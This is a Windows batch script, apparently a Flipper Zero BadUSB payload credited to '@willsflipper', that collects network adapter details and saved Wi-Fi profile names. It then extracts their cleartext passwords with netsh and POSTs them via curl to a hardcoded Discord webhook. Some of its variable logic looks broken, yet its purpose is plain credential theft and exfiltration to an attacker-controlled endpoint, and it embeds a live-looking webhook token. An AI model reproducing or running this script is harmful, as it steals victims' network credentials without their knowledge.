@echo off

REM Created by Will | @willsflipper
REM
REM :::       ::: ::::::::::: :::        :::        
REM :+:       :+:     :+:     :+:        :+:        
REM +:+       +:+     +:+     +:+        +:+        
REM +#+  +:+  +#+     +#+     +#+        +#+        
REM +#+ +#+#+ +#+     +#+     +#+        +#+        
REM  #+#+# #+#+#      #+#     #+#        #+#        
REM   ###   ###   ########### ########## ##########

set "webhookUrl=https://discord.com/api/webhooks/1069011168993230930/cGeC4LkDJNsvyA6bUJ4leZUsdBkjjjm2eouS3CIgf7DMwh_MMjG3mWZKMpYP3-suKR4u"
if "%webhookUrl%"=="" exit

setlocal enabledelayedexpansion

set "Network="
for /F "tokens=1-5 delims=," %%A in ('wmic.exe nicconfig where "MACAddress is not null" get Index^,Description^,IPAddress^,DefaultIPGateway^,MACAddress /format:csv ^| findstr /v /c:"Index"^ /c:"Win32_NetworkAdapterConfiguration"') do (
    set "Index=%%~A"
    set "Description=%%~B"
    set "IPAddress=%%~C"
    set "DefaultIPGateway=%%~D"
    set "MACAddress=%%~E"
    echo Index: !Index!, Description: !Description!, IPAddress: !IPAddress!, DefaultIPGateway: !DefaultIPGateway!, MACAddress: !MACAddress!
)

set "WLANProfileNames="
for /F "tokens=2 delims=:" %%A in ('netsh.exe wlan show profiles ^| findstr /r /c:" : "') do (
    set "WLANProfileName=%%A"
    setlocal enabledelayedexpansion
    echo !WLANProfileName!
    endlocal
)

set "output="
set "discordProfiles="

for %%A in (%WLANProfileNames%) do (
    set "WLANProfileName=%%A"
    set "WLANProfilePassword="
    setlocal enabledelayedexpansion
    for /F "tokens=2 delims=:" %%B in ('netsh.exe wlan show profile name^="!WLANProfileName!" key^=clear ^| findstr /r /c:"Key Content"') do (
        set "WLANProfilePassword=%%B"
    )
    if "%webhookUrl%"=="discord.com/api/webhooks/" (
        set "discordProfiles=!discordProfiles!ssid: !WLANProfileName!\npass: !WLANProfilePassword!\n"
        set "output={"content": null,"embeds": [{"title": "WiFis:","description": "!discordProfiles!","color": 16753920,"author": {"name": "WiFis Recieved"},"footer": {"text": "will | @willsflipper","icon_url": "https://thumb.tildacdn.com/tild6664-3230-4633-b839-313833343662/-/resize/300x/-/format/webp/qFlipper_macOS_256px.png"}}]}"
    ) else (
        set "object=%output%"
        if "!object!"=="" (
            set "object={"SSID": "Password"}"
        )
        setlocal disabledelayedexpansion
        set "!WLANProfileName!=!WLANProfilePassword!"
        setlocal
    )
    endlocal
)

curl -H "Content-Type: application/json" -X POST -d "%output%" "%webhookUrl%"
